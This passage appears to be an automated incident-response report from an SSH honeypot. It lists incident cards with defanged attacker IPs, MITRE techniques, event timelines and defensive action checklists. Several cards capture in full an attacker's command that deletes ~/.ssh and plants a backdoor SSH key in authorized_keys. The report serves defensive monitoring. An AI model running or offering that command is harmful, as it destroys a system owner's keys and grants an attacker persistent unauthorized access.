| `2026-04-26 09:19:36` | `cowrie.session.connect` |
| `2026-04-26 09:19:36` | `cowrie.client.version` |
| `2026-04-26 09:19:36` | `cowrie.client.kex` |
| `2026-04-26 09:19:37` | `cowrie.login.success` |
| `2026-04-26 09:19:37` | `cowrie.session.params` |
| `2026-04-26 09:19:37` | `cowrie.command.input` |
| `2026-04-26 09:19:37` | `cowrie.command.failed` |
| `2026-04-26 09:19:38` | `cowrie.log.closed` |
| `2026-04-26 09:19:38` | `cowrie.session.params` |
| `2026-04-26 09:19:38` | `cowrie.command.input` |
| `2026-04-26 09:19:38` | `cowrie.session.file_download` |
| `2026-04-26 09:19:38` | `cowrie.log.closed` |
| `2026-04-26 09:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb4194d63248

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-26 09:19 |
| **Last Seen** | 2026-04-26 09:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 09:19:41` | `cowrie.session.connect` |
| `2026-04-26 09:19:41` | `cowrie.client.version` |
| `2026-04-26 09:19:41` | `cowrie.client.kex` |
| `2026-04-26 09:19:42` | `cowrie.login.success` |
| `2026-04-26 09:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b5e21ddb89c

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-26 09:31 |
| **Last Seen** | 2026-04-26 09:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 09:31:41` | `cowrie.session.connect` |
| `2026-04-26 09:31:41` | `cowrie.client.version` |
| `2026-04-26 09:31:41` | `cowrie.client.kex` |
| `2026-04-26 09:31:42` | `cowrie.login.success` |
| `2026-04-26 09:31:42` | `cowrie.session.params` |
| `2026-04-26 09:31:42` | `cowrie.command.input` |
| `2026-04-26 09:31:42` | `cowrie.command.failed` |
| `2026-04-26 09:31:42` | `cowrie.log.closed` |
| `2026-04-26 09:31:42` | `cowrie.session.params` |
| `2026-04-26 09:31:42` | `cowrie.command.input` |
| `2026-04-26 09:31:43` | `cowrie.session.file_download` |
| `2026-04-26 09:31:43` | `cowrie.log.closed` |
| `2026-04-26 09:31:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a636365d359

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-26 09:31 |
| **Last Seen** | 2026-04-26 09:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 09:31:44` | `cowrie.session.connect` |
| `2026-04-26 09:31:44` | `cowrie.client.version` |
| `2026-04-26 09:31:45` | `cowrie.client.kex` |
| `2026-04-26 09:31:45` | `cowrie.login.success` |
| `2026-04-26 09:31:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e89e1caf3fe

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-26 09:32 |
| **Last Seen** | 2026-04-26 09:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 09:32:39` | `cowrie.session.connect` |
| `2026-04-26 09:32:39` | `cowrie.client.version` |
| `2026-04-26 09:32:39` | `cowrie.client.kex` |
| `2026-04-26 09:32:40` | `cowrie.login.success` |
| `2026-04-26 09:32:40` | `cowrie.session.params` |
| `2026-04-26 09:32:40` | `cowrie.command.input` |
| `2026-04-26 09:32:40` | `cowrie.command.failed` |
| `2026-04-26 09:32:40` | `cowrie.log.closed` |
| `2026-04-26 09:32:40` | `cowrie.session.params` |
| `2026-04-26 09:32:40` | `cowrie.command.input` |
| `2026-04-26 09:32:40` | `cowrie.session.file_download` |
| `2026-04-26 09:32:40` | `cowrie.log.closed` |
| `2026-04-26 09:32:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e73ff216c5aa

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-26 09:32 |
| **Last Seen** | 2026-04-26 09:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 09:32:42` | `cowrie.session.connect` |
| `2026-04-26 09:32:42` | `cowrie.client.version` |
| `2026-04-26 09:32:42` | `cowrie.client.kex` |
| `2026-04-26 09:32:43` | `cowrie.login.success` |
| `2026-04-26 09:32:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd1fd5cd0349

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-26 09:33 |
| **Last Seen** | 2026-04-26 09:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 09:33:37` | `cowrie.session.connect` |
| `2026-04-26 09:33:37` | `cowrie.client.version` |
| `2026-04-26 09:33:37` | `cowrie.client.kex` |
| `2026-04-26 09:33:37` | `cowrie.login.success` |
| `2026-04-26 09:33:38` | `cowrie.session.params` |
| `2026-04-26 09:33:38` | `cowrie.command.input` |
| `2026-04-26 09:33:38` | `cowrie.command.failed` |
| `2026-04-26 09:33:38` | `cowrie.log.closed` |
| `2026-04-26 09:33:38` | `cowrie.session.params` |
| `2026-04-26 09:33:38` | `cowrie.command.input` |
| `2026-04-26 09:33:38` | `cowrie.session.file_download` |
| `2026-04-26 09:33:38` | `cowrie.log.closed` |
| `2026-04-26 09:33:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf971d553240

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-26 09:33 |
| **Last Seen** | 2026-04-26 09:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 09:33:40` | `cowrie.session.connect` |
| `2026-04-26 09:33:40` | `cowrie.client.version` |
| `2026-04-26 09:33:40` | `cowrie.client.kex` |
| `2026-04-26 09:33:40` | `cowrie.login.success` |
| `2026-04-26 09:33:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3d67ba55b16

| Field | Detail |
|---|---|
| **Source IP** | `179.111.100[.]172` |
| **First Seen** | 2026-04-26 09:58 |
| **Last Seen** | 2026-04-26 09:58 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 09:58:04` | `cowrie.session.connect` |
| `2026-04-26 09:58:04` | `cowrie.client.version` |
| `2026-04-26 09:58:04` | `cowrie.client.kex` |
| `2026-04-26 09:58:06` | `cowrie.login.success` |
| `2026-04-26 09:58:07` | `cowrie.session.params` |
| `2026-04-26 09:58:07` | `cowrie.command.input` |
| `2026-04-26 09:58:07` | `cowrie.command.failed` |
| `2026-04-26 09:58:07` | `cowrie.log.closed` |
| `2026-04-26 09:58:08` | `cowrie.session.params` |
| `2026-04-26 09:58:08` | `cowrie.command.input` |
| `2026-04-26 09:58:08` | `cowrie.session.file_download` |
| `2026-04-26 09:58:08` | `cowrie.log.closed` |
| `2026-04-26 09:58:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.111.100[.]172` to AbuseIPDB if not already reported
- [ ] Block `179.111.100[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59147f2b917f

| Field | Detail |
|---|---|
| **Source IP** | `179.111.100[.]172` |
| **First Seen** | 2026-04-26 09:58 |
| **Last Seen** | 2026-04-26 09:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 09:58:11` | `cowrie.session.connect` |
| `2026-04-26 09:58:11` | `cowrie.client.version` |
| `2026-04-26 09:58:12` | `cowrie.client.kex` |
| `2026-04-26 09:58:13` | `cowrie.login.success` |
| `2026-04-26 09:58:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.111.100[.]172` to AbuseIPDB if not already reported
- [ ] Block `179.111.100[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e6d8897fb3c

| Field | Detail |
|---|---|
| **Source IP** | `152.32.130[.]174` |
| **First Seen** | 2026-04-26 10:09 |
| **Last Seen** | 2026-04-26 10:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 10:09:15` | `cowrie.session.connect` |
| `2026-04-26 10:09:15` | `cowrie.client.version` |
| `2026-04-26 10:09:15` | `cowrie.client.kex` |
| `2026-04-26 10:09:15` | `cowrie.login.success` |
| `2026-04-26 10:09:15` | `cowrie.session.params` |
| `2026-04-26 10:09:15` | `cowrie.command.input` |
| `2026-04-26 10:09:15` | `cowrie.command.failed` |
| `2026-04-26 10:09:16` | `cowrie.log.closed` |
| `2026-04-26 10:09:16` | `cowrie.session.params` |
| `2026-04-26 10:09:16` | `cowrie.command.input` |
| `2026-04-26 10:09:16` | `cowrie.session.file_download` |
| `2026-04-26 10:09:16` | `cowrie.log.closed` |
| `2026-04-26 10:09:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.130[.]174` to AbuseIPDB if not already reported
- [ ] Block `152.32.130[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c92aecf0d4d

| Field | Detail |
|---|---|
| **Source IP** | `152.32.130[.]174` |
| **First Seen** | 2026-04-26 10:09 |
| **Last Seen** | 2026-04-26 10:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 10:09:18` | `cowrie.session.connect` |
| `2026-04-26 10:09:18` | `cowrie.client.version` |
| `2026-04-26 10:09:18` | `cowrie.client.kex` |
| `2026-04-26 10:09:18` | `cowrie.login.success` |
| `2026-04-26 10:09:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.130[.]174` to AbuseIPDB if not already reported
- [ ] Block `152.32.130[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c86bce3f070c

| Field | Detail |
|---|---|
| **Source IP** | `150.136.214[.]177` |
| **First Seen** | 2026-04-26 10:19 |
| **Last Seen** | 2026-04-26 10:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 10:19:14` | `cowrie.session.connect` |
| `2026-04-26 10:19:14` | `cowrie.client.version` |
| `2026-04-26 10:19:14` | `cowrie.client.kex` |
| `2026-04-26 10:19:15` | `cowrie.login.success` |
| `2026-04-26 10:19:15` | `cowrie.session.params` |
| `2026-04-26 10:19:15` | `cowrie.command.input` |
| `2026-04-26 10:19:15` | `cowrie.command.failed` |
| `2026-04-26 10:19:16` | `cowrie.log.closed` |
| `2026-04-26 10:19:16` | `cowrie.session.params` |
| `2026-04-26 10:19:16` | `cowrie.command.input` |
| `2026-04-26 10:19:17` | `cowrie.session.file_download` |
| `2026-04-26 10:19:17` | `cowrie.log.closed` |
| `2026-04-26 10:19:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.136.214[.]177` to AbuseIPDB if not already reported
- [ ] Block `150.136.214[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfcc5a912caa

| Field | Detail |
|---|---|
| **Source IP** | `150.136.214[.]177` |
| **First Seen** | 2026-04-26 10:19 |
| **Last Seen** | 2026-04-26 10:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 10:19:20` | `cowrie.session.connect` |
| `2026-04-26 10:19:20` | `cowrie.client.version` |
| `2026-04-26 10:19:20` | `cowrie.client.kex` |
| `2026-04-26 10:19:21` | `cowrie.login.success` |
| `2026-04-26 10:19:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.136.214[.]177` to AbuseIPDB if not already reported
- [ ] Block `150.136.214[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cafb8262609

| Field | Detail |
|---|---|
| **Source IP** | `179.111.100[.]172` |
| **First Seen** | 2026-04-26 10:22 |
| **Last Seen** | 2026-04-26 10:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 10:22:01` | `cowrie.session.connect` |
| `2026-04-26 10:22:01` | `cowrie.client.version` |
| `2026-04-26 10:22:02` | `cowrie.client.kex` |
| `2026-04-26 10:22:03` | `cowrie.login.success` |
| `2026-04-26 10:22:04` | `cowrie.session.params` |
| `2026-04-26 10:22:04` | `cowrie.command.input` |
| `2026-04-26 10:22:04` | `cowrie.command.failed` |
| `2026-04-26 10:22:04` | `cowrie.log.closed` |
| `2026-04-26 10:22:05` | `cowrie.session.params` |
| `2026-04-26 10:22:05` | `cowrie.command.input` |
| `2026-04-26 10:22:05` | `cowrie.session.file_download` |
| `2026-04-26 10:22:05` | `cowrie.log.closed` |
| `2026-04-26 10:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.111.100[.]172` to AbuseIPDB if not already reported
- [ ] Block `179.111.100[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-964baaa2a721

| Field | Detail |
|---|---|
| **Source IP** | `179.111.100[.]172` |
| **First Seen** | 2026-04-26 10:22 |
| **Last Seen** | 2026-04-26 10:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 10:22:09` | `cowrie.session.connect` |
| `2026-04-26 10:22:09` | `cowrie.client.version` |
| `2026-04-26 10:22:09` | `cowrie.client.kex` |
| `2026-04-26 10:22:10` | `cowrie.login.success` |
| `2026-04-26 10:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.111.100[.]172` to AbuseIPDB if not already reported
- [ ] Block `179.111.100[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-374995f382f9

| Field | Detail |
|---|---|
| **Source IP** | `179.111.100[.]172` |
| **First Seen** | 2026-04-26 10:25 |
| **Last Seen** | 2026-04-26 10:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 10:25:26` | `cowrie.session.connect` |
| `2026-04-26 10:25:26` | `cowrie.client.version` |
| `2026-04-26 10:25:27` | `cowrie.client.kex` |
| `2026-04-26 10:25:28` | `cowrie.login.success` |
| `2026-04-26 10:25:29` | `cowrie.session.params` |
| `2026-04-26 10:25:29` | `cowrie.command.input` |
| `2026-04-26 10:25:29` | `cowrie.command.failed` |
| `2026-04-26 10:25:29` | `cowrie.log.closed` |
| `2026-04-26 10:25:30` | `cowrie.session.params` |
| `2026-04-26 10:25:30` | `cowrie.command.input` |
| `2026-04-26 10:25:30` | `cowrie.session.file_download` |
| `2026-04-26 10:25:30` | `cowrie.log.closed` |
| `2026-04-26 10:25:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.111.100[.]172` to AbuseIPDB if not already reported
- [ ] Block `179.111.100[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b43cf68f733

| Field | Detail |
|---|---|
| **Source IP** | `179.111.100[.]172` |
| **First Seen** | 2026-04-26 10:25 |
| **Last Seen** | 2026-04-26 10:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 10:25:34` | `cowrie.session.connect` |
| `2026-04-26 10:25:34` | `cowrie.client.version` |
| `2026-04-26 10:25:34` | `cowrie.client.kex` |
